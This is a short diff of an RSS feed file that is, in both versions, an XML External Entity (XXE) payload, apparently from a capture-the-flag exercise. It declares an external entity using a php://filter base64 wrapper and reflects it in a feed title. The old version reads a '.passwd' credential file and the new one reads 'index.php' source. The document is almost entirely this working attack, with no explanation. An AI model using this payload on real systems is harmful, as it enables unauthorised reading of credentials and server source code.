@@ -1,15 +1,9 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [
-  <!ENTITY include SYSTEM "php://filter/convert.base64-encode/resource=.passwd">
-]>
+<?xml version="1.0" ?>
+<!DOCTYPE replace [<!ENTITY include SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <rss version="2.0">
   <channel>
-    <title>&include;</title>
-    <description>description</description>
-    
-    <link>http://community.local.adxstudio.com/news-feed/</link>
-        <item>
-          <title>article title</title>
+    <item>
+          <title>&include;</title>
           <description>test </description>
           <link>http://community.local.adxstudio.com/news/news-articles-1/</link>
         </item>
